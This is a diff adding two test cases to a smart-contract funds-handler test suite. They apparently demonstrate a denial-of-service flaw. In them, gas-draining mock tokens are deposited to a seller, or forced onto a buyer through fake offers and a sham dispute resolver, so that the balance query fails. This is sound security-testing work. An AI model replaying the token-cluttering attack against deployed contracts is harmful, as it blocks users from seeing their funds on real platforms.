@@ -1440,6 +1440,178 @@ describe("IBosonFundsHandler", function () {
         expect(returnedAvailableFunds).to.eql(expectedAvailableFunds);
       });
     });
+
+    it("DoS getAvailable funds - attack on seller", async function () {
+      // Deploy the mock token that consumes all gas in the name getter
+      const [mockToken] = await deployMockTokens(["Foreign20MaliciousName"]);
+      const [mockToken2] = await deployMockTokens(["Foreign20MaliciousName"]);
+      const [mockToken3] = await deployMockTokens(["Foreign20"]);
+
+      // top up operators account
+      await mockToken.mint(operator.address, "1000000");
+      await mockToken2.mint(operator.address, "1000000");
+      await mockToken3.mint(operator.address, "1000000");
+
+      // approve protocol to transfer the tokens
+      await mockToken.connect(operator).approve(protocolDiamond.address, "1000000");
+      await mockToken2.connect(operator).approve(protocolDiamond.address, "1000000");
+      await mockToken3.connect(operator).approve(protocolDiamond.address, "1000000");
+
+      // Deposit token - seller
+      await fundsHandler
+        .connect(operator)
+        .depositFunds(seller.id, ethers.constants.AddressZero, depositAmount, { value: depositAmount });
+      // Deposit token - attacker
+      await fundsHandler.connect(operator).depositFunds(seller.id, mockToken.address, depositAmount);
+      await fundsHandler.connect(operator).depositFunds(seller.id, mockToken2.address, depositAmount);
+      await fundsHandler.connect(operator).depositFunds(seller.id, mockToken3.address, depositAmount);
+
+      // Read on chain state - this fails:
+      try {
+        let returnedAvailableFunds = FundsList.fromStruct(await fundsHandler.getAvailableFunds(seller.id));
+
+        console.log(returnedAvailableFunds);
+      } catch (e) {
+        console.log(e);
+      }
+
+      // withdraw is still possible
+      await expect(
+        fundsHandler.connect(clerk).withdrawFunds(seller.id, [ethers.constants.AddressZero], [depositAmount])
+      )
+        .to.emit(fundsHandler, "FundsWithdrawn")
+        .withArgs(seller.id, treasury.address, ethers.constants.AddressZero, depositAmount, clerk.address);
+    });
+
+    it.only("DoS getAvailable funds - attack on buyer", async function () {
+      // Deploy the mock token that consumes all gas in the name getter
+      const [mockToken] = await deployMockTokens(["Foreign20MaliciousName"]);
+      const [mockToken2] = await deployMockTokens(["Foreign20MaliciousName"]);
+      const [mockToken3] = await deployMockTokens(["Foreign20"]);
+
+      // top up operators account
+      await mockToken.mint(operator.address, "1000000");
+      await mockToken2.mint(operator.address, "1000000");
+      await mockToken3.mint(operator.address, "1000000");
+
+      // approve protocol to transfer the tokens
+      await mockToken.connect(operator).approve(protocolDiamond.address, "1000000");
+      await mockToken2.connect(operator).approve(protocolDiamond.address, "1000000");
+      await mockToken3.connect(operator).approve(protocolDiamond.address, "1000000");
+
+      // Deposit token - attacker
+      await fundsHandler
+        .connect(operator)
+        .depositFunds(seller.id, ethers.constants.AddressZero, depositAmount, { value: depositAmount });
+      await fundsHandler.connect(operator).depositFunds(seller.id, mockToken.address, depositAmount);
+      await fundsHandler.connect(operator).depositFunds(seller.id, mockToken2.address, depositAmount);
+      await fundsHandler.connect(operator).depositFunds(seller.id, mockToken3.address, depositAmount);
+
+      disputeResolver = mockDisputeResolver(
+        operatorDR.address,
+        adminDR.address,
+        clerkDR.address,
+        treasuryDR.address,
+        true
+      );
+
+      disputeResolverFees = [new DisputeResolverFee(ethers.constants.AddressZero, "Native", "0")];
+
+      // Make empty seller list, so every seller is allowed
+      const sellerAllowList = [];
+
+      // Register the dispute resolver
+      await accountHandler
+        .connect(adminDR)
+        .createDisputeResolver(disputeResolver, disputeResolverFees, sellerAllowList);
+
+      // Mock offer - true offer
+      const { offer, offerDates, offerDurations, disputeResolverId } = await mockOffer();
+      offer.sellerDeposit = "1";
+      offerNative = offer.clone();
+      await offerHandler
+        .connect(operator)
+        .createOffer(offerNative, offerDates, offerDurations, disputeResolverId, agentId);
+      voucherRedeemableFrom = offerDates.voucherRedeemableFrom;
+      // buyer normally commits, redeems and finalizes
+      await exchangeHandler.connect(buyer).commitToOffer(buyer.address, offerNative.id, { value: offerNative.price });
+      let exchangeId = "1";
+      await exchangeHandler.connect(operator).revokeVoucher(exchangeId);
+
+      let buyerEntity = mockBuyer(buyer);
+
+      // FORCE FEED THE BUYER WITH MALICIOUS TOKENS
+      // create malicious offers
+      offer.price = "0";
+      offer.buyerCancelPenalty = "0";
+
+      const offerMalicious1 = offer.clone();
+      const offerMalicious2 = offer.clone();
+      const offerMalicious3 = offer.clone();
+
+      offerMalicious1.exchangeToken = mockToken.address;
+      offerMalicious2.exchangeToken = mockToken2.address;
+      offerMalicious3.exchangeToken = mockToken3.address;
+
+      // create fake dispute resolver
+      const disputeResolver2 = mockDisputeResolver(
+        operator.address,
+        operator.address,
+        operator.address,
+        operator.address,
+        true
+      );
+
+      disputeResolverFees = [
+        new DisputeResolverFee(mockToken.address, "mt1", "0"),
+        new DisputeResolverFee(mockToken2.address, "mt2", "0"),
+        new DisputeResolverFee(mockToken3.address, "mt3", "0"),
+      ];
+
+      // Register the dispute resolver
+      await accountHandler
+        .connect(operator)
+        .createDisputeResolver(disputeResolver2, disputeResolverFees, sellerAllowList);
+
+      // create malicious offers
+      await offerHandler
+        .connect(operator)
+        .createOffer(offerMalicious1, offerDates, offerDurations, disputeResolver2.id, agentId);
+
+      await offerHandler
+        .connect(operator)
+        .createOffer(offerMalicious2, offerDates, offerDurations, disputeResolver2.id, agentId);
+
+      await offerHandler
+        .connect(operator)
+        .createOffer(offerMalicious3, offerDates, offerDurations, disputeResolver2.id, agentId);
+
+      // commit on buyer's behalf
+      await exchangeHandler.connect(operator).commitToOffer(buyer.address, "2");
+      await exchangeHandler.connect(operator).commitToOffer(buyer.address, "3");
+      await exchangeHandler.connect(operator).commitToOffer(buyer.address, "4");
+
+      // revoke all vouchers, effectively cluttering buyer's funds
+      await exchangeHandler.connect(operator).revokeVoucher("2");
+      await exchangeHandler.connect(operator).revokeVoucher("3");
+      await exchangeHandler.connect(operator).revokeVoucher("4");
+
+      // Read on chain state - this fails:
+      try {
+        let returnedAvailableFunds = FundsList.fromStruct(await fundsHandler.getAvailableFunds(buyerEntity.id));
+
+        console.log(returnedAvailableFunds);
+      } catch (e) {
+        console.log(e);
+      }
+
+      // withdraw is still possible
+      await expect(
+        fundsHandler.connect(buyer).withdrawFunds(buyerEntity.id, [ethers.constants.AddressZero], [offerNative.price])
+      )
+        .to.emit(fundsHandler, "FundsWithdrawn")
+        .withArgs(buyerEntity.id, buyer.address, ethers.constants.AddressZero, offerNative.price, buyer.address);
+    });
   });
 
   // Funds library methods.
